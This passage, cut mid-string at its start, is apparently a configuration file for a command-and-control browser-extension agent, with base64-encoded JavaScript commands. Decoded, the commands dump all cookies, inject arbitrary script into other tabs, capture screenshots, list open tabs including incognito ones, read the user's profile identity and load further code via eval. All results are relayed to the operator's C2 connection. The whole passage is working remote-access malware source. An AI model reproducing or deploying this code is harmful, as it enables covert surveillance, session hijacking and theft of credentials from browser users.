uLi5yYXcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2YWwobG9hZC5kYXRhKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzpsb2FkLnRhc2tfaWQsICd1c2VyX291dHB1dCc6IGxvYWQubmFtZSArICIgbG9hZGVkIiwgImNvbXBsZXRlZCI6dHJ1ZX07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geydhY3Rpb24nOidwb3N0X3Jlc3BvbnNlJywgJ3Jlc3BvbnNlcyc6W3Jlc3BvbnNlXSwgJ2RlbGVnYXRlcyc6W119OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2Fkc1tqXSA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgfQp9Ow=="}]},"load_transforms":[],"create_transforms":[{"parameter_type":"String","parameter":"extension_name update_url homepage_url version","description":"Provide the extension name, update url, home page url, and version for the extension","name":"chrome_compile_and_return","order":1}],"commands":[{"needs_admin":false,"help_cmd":"cookiedump","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","author":"","description":"Dump all cookies for the current session","cmd":"cookiedump","parameters":[],"attack":[],"artifacts":[],"files":[{"cookiedump.js":"Y29va2llZHVtcCA9IGZ1bmN0aW9uKHRhc2spIHsKICAgIGxldCByZXN1bHRzID0gW107CiAgICBjaHJvbWUuY29va2llcy5nZXRBbGxDb29raWVTdG9yZXMoZnVuY3Rpb24oc3RvcmVzKSB7CiAgICAgICAgc3RvcmVzLmZvckVhY2goZnVuY3Rpb24gKHN0b3JlKSB7CiAgICAgICAgICAgIGNvbnN0IGZpbHRlciA9IHt9OwogICAgICAgICAgICBmaWx0ZXJbInN0b3JlSWQiXSA9IHN0b3JlLmlkOwogICAgICAgICAgICBjaHJvbWUuY29va2llcy5nZXRBbGwoeyJzdG9yZUlkIjogc3RvcmUuaWR9LCBmdW5jdGlvbiAoY29va2llcykgewogICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzp0YXNrLmlkLCAndXNlcl9vdXRwdXQnOkpTT04uc3RyaW5naWZ5KGNvb2tpZXMsIG51bGwsIDIpLCAnY29tcGxldGVkJzp0cnVlfTsKICAgICAgICAgICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKICAgIH0pOwp9OwoKQzIuY29tbWFuZHNbY29va2llZHVtcC5uYW1lXSA9IGNvb2tpZWR1bXA7CkNPTU1BTkRfRU5EU19IRVJFCg=="}]},{"needs_admin":false,"help_cmd":"inject {\"tabid\":0,\"javascript\":\"base64 code\"}","version":3,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","author":"","description":"Inject arbitrary javascript into another tab","cmd":"inject","parameters":[{"type":"String","hint":"Base64 encoded javascript","choices":"","required":true,"name":"javascript"},{"type":"Number","hint":"","choices":"","required":true,"name":"tabid"}],"attack":[],"artifacts":[],"files":[{"inject.js":"aW5qZWN0ID0gZnVuY3Rpb24odGFzaykgewogICAgLy8gZXhlY3V0ZSBjdXN0b20gamF2YXNjcmlwdCBjb2RlIGluIGEgdGFiCiAgICBsZXQgYXJncyA9IEpTT04ucGFyc2UoYXRvYih0YXNrLnBhcmFtZXRlcnMudG9TdHJpbmcoKSkpOwogICAgY29uc3QgdGFiID0gTWF0aC5yb3VuZChhcmdzLnRhYmlkKTsKICAgIGNvbnN0IGNvZGUgPSBhdG9iKGFyZ3MuamF2YXNjcmlwdCk7CiAgICBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KHRhYiwgewogICAgICAgIGNvZGU6IGNvZGUKICAgIH0sIGZ1bmN0aW9uKCl7CiAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICBDMi5zZW5kRXJyb3IodGFza2lkLCB0YXNrdHlwZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyJ0YXNrX2lkIjp0YXNrLmlkLCAidXNlcl9vdXRwdXQiOiJpbmplY3RlZCBjb2RlIGludG8gdGFiIHdpdGggaWQgIiArIHRhYiwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7ImFjdGlvbiI6InBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjpbcmVzcG9uc2VdLCAiZGVsZWdhdGVzIjpbXX07CiAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgIH0KICAgIH0pOwp9OwoKQzIuY29tbWFuZHNbaW5qZWN0Lm5hbWVdID0gaW5qZWN0OwpDT01NQU5EX0VORFNfSEVSRQo="}]},{"needs_admin":false,"help_cmd":"load [command name]","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","author":"","description":"Dynamically load a command into the callback","cmd":"load","parameters":[],"attack":[],"artifacts":[],"files":[{"load.js":"bG9hZCA9IGZ1bmN0aW9uKHRhc2spIHsKICAgIC8vIFRPRE86IGxvYWQKICAgIGxldCBhcmdzID0gSlNPTi5wYXJzZSh0YXNrLnBhcmFtZXRlcnMpOwogICAgbGV0IHJlc3BvbnNlID0geydhY3Rpb24nOid1cGxvYWQnLCdmdWxsX3BhdGgnOicnLCAnY2h1bmtfc2l6ZSc6MTAyNDAwMCwgJ2NodW5rX251bSc6MSwnZmlsZV9pZCc6YXJncy5maWxlX2lkfTsKICAgIGxldCBlbmNvZGVkUmVzcG9uc2UgPSBKU09OLnN0cmluZ2lmeShyZXNwb25zZSk7CiAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmNvZGVkUmVzcG9uc2U7CiAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICBvdXQucHVzaChtc2cpOwogICAgbG9hZHMucHVzaCh7J3R5cGUnOidsb2FkJywnbmFtZSc6IGFyZ3MuY21kcywnZmlsZV9pZCc6YXJncy5maWxlX2lkLCAndGFza19pZCc6dGFzay5pZCwnZGF0YSc6W119KTsKfTsKCkMyLmNvbW1hbmRzW2xvYWQubmFtZV0gPSBsb2FkOwpDT01NQU5EX0VORFNfSEVSRQ=="}]},{"needs_admin":false,"help_cmd":"screencapture","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","author":"","description":"Capture a screenshot of the active tab","cmd":"screencapture","parameters":[],"attack":[],"artifacts":[],"files":[{"screencapture.js":"c2NyZWVuY2FwdHVyZSA9IGZ1bmN0aW9uKHRhc2spewogICAgY2hyb21lLnRhYnMuY2FwdHVyZVZpc2libGVUYWIobnVsbCwgZnVuY3Rpb24oaW1nKSB7CiAgICAgICAgCiAgICAgICAgaWYgKGltZyA9PT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIGxldCByZXNwb25zZSA9IHsndGFza19pZCc6dGFzay5pZCwgJ3VzZXJfb3V0cHV0JzogJ3NjcmVlbmNhcHR1cmUgZmFpbGVkJywgJ2NvbXBsZXRlZCc6IGZhbHNlLCAnc3RhdHVzJzonZXJyb3InfTsKICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBsZXQgZW5jSW1nID0gaW1nLnRvU3RyaW5nKCkuc3BsaXQoJywnKVsxXTsKICAgICAgICAgICAgbGV0IHJhdyA9IGF0b2IoZW5jSW1nKTsKICAgICAgICAgICAgbGV0IHRvdGFsY2h1bmtzID0gTWF0aC5jZWlsKHJhdy5sZW5ndGggLyA1MTIwMDApOwogICAgICAgICAgICBsZXQgcmVzcG9uc2UgPSB7J3RvdGFsX2NodW5rcyc6dG90YWxjaHVua3MsICd0YXNrX2lkJzp0YXNrLmlkLCAnZnVsbF9wYXRoJzp0YXNrLnBhcmFtZXRlcnN9OwogICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7ImFjdGlvbiI6InBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjpbcmVzcG9uc2VdLCAiZGVsZWdhdGVzIjpbXX07CiAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgICAgICAKICAgICAgICAgICAgc2NyZWVuY2FwdHVyZXMucHVzaCh7J3R5cGUnOidzY3JlZW5jYXB0dXJlJywndGFza19pZCc6dGFzay5pZCwgJ2ltYWdlJzpyYXcsICd0b3RhbF9jaHVua3MnOiB0b3RhbGNodW5rc30pOwogICAgICAgIH0KCiAgICB9KTsKfTsKCkMyLmNvbW1hbmRzW3NjcmVlbmNhcHR1cmUubmFtZV0gPSBzY3JlZW5jYXB0dXJlOwpDT01NQU5EX0VORFNfSEVSRQo="}]},{"needs_admin":false,"help_cmd":"tabs","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","author":"","description":"Retrieve information on all open tabs","cmd":"tabs","parameters":[],"attack":[],"artifacts":[],"files":[{"tabs.js":"dGFicyA9IGZ1bmN0aW9uKHRhc2spIHsKICAgIGNvbnN0IHF1ZXJ5SW5mbyA9IHt9OwogICAgbGV0IHRhYnMgPVtdOwogICAgY2hyb21lLnRhYnMucXVlcnkocXVlcnlJbmZvLCBmdW5jdGlvbihyZXN1bHQpewogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgcmVzdWx0Lmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIGNvbnN0IGluZGl2aWR1YWxUYWIgPSB7fTsKICAgICAgICAgICAgaW5kaXZpZHVhbFRhYi53aW5kb3cgPSByZXN1bHRbaV0udGl0bGU7CiAgICAgICAgICAgIGluZGl2aWR1YWxUYWIudXJsID0gcmVzdWx0W2ldLnVybDsKICAgICAgICAgICAgaW5kaXZpZHVhbFRhYi5pbmNvZ25pdG8gPSByZXN1bHRbaV0uaW5jb2duaXRvOwogICAgICAgICAgICBpbmRpdmlkdWFsVGFiLmlkID0gcmVzdWx0W2ldLmlkOwogICAgICAgICAgICBpbmRpdmlkdWFsVGFiLmFjdGl2ZSA9IHJlc3VsdFtpXS5hY3RpdmU7CiAgICAgICAgICAgIGluZGl2aWR1YWxUYWIuaGlnaGxpZ2h0ZWQgPSByZXN1bHRbaV0uaGlnaGxpZ2h0ZWQ7CiAgICAgICAgICAgIGluZGl2aWR1YWxUYWIud2luZG93aWQgPSByZXN1bHRbaV0ud2luZG93SWQ7CgogICAgICAgICAgICB0YWJzLnB1c2goaW5kaXZpZHVhbFRhYik7CiAgICAgICAgfQoKICAgICAgICBsZXQgb3V0cHV0ID0gSlNPTi5zdHJpbmdpZnkodGFicywgbnVsbCwgMik7CiAgICAgICAgbGV0IHJlc3BvbnNlID0geyJ0YXNrX2lkIjp0YXNrLmlkLCAidXNlcl9vdXRwdXQiOm91dHB1dCwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgIH0pOwp9OwoKQzIuY29tbWFuZHNbdGFicy5uYW1lXSA9IHRhYnM7CkNPTU1BTkRfRU5EU19IRVJFCg=="}]},{"needs_admin":false,"help_cmd":"exit","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","author":"","description":"Exit the current callback","cmd":"exit","parameters":[],"attack":[],"artifacts":[],"files":[{"exit.js":"ZXhpdCA9IGZ1bmN0aW9uKHRhc2spIHsKICAgIGxldCByZXNwb25zZSA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0IjoiZXhpdGluZyIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICBsZXQgbWV0YSA9IHsKICAgICAgICAiZGF0YSI6IG1zZywKICAgICAgICAiY2xpZW50IjogdHJ1ZSwKICAgICAgICAidGFnIjoiIiwKICAgIH07CiAgICBsZXQgZnVsbG1zZyA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgY29ubmVjdGlvbi5zZW5kKGZ1bGxtc2cpOwogICAgc2V0VGltZW91dChmdW5jdGlvbiBuYW1lKHBhcmFtcykgewogICAgICAgIGNvbm5lY3Rpb24uY2xvc2UoKTsKICAgIH0sIEMyLmludGVydmFsKTsKfQoKQzIuY29tbWFuZHNbZXhpdC5uYW1lXSA9IGV4aXQ7CkNPTU1BTkRfRU5EU19IRVJF"}]},{"needs_admin":false,"help_cmd":"userinfo","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","author":"","description":"Retrieve information about the current user","cmd":"userinfo","parameters":[],"attack":[],"artifacts":[],"files":[{"userinfo.js":"dXNlcmluZm8gPSBmdW5jdGlvbih0YXNrKSB7CiAgICBjaHJvbWUuaWRlbnRpdHkuZ2V0UHJvZmlsZVVzZXJJbmZvKGZ1bmN0aW9uKGluZm8pewogICAgICAgIGlmIChpbmZvID09PSB1bmRlZmluZWQpIHsKICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzp0YXNrLmlkLCAndXNlcl9vdXRwdXQnOiAndXNlcmluZm8gZmFpbGVkJywgJ2NvbXBsZXRlZCc6IGZhbHNlLCAnc3RhdHVzJzonZXJyb3InfTsKICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBsZXQgcmVzcG9uc2UgPSB7InRhc2tfaWQiOnRhc2suaWQsICJ1c2VyX291dHB1dCI6SlNPTi5zdHJpbmdpZnkoaW5mbywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgICAgICB9CiAgICB9KTsKfTsKCkMyLmNvbW1hbmRzW3VzZXJpbmZvLm5hbWVdID0gdXNlcmluZm87CkNPTU1BTkRfRU5EU19IRVJFCg=="}]}]}]}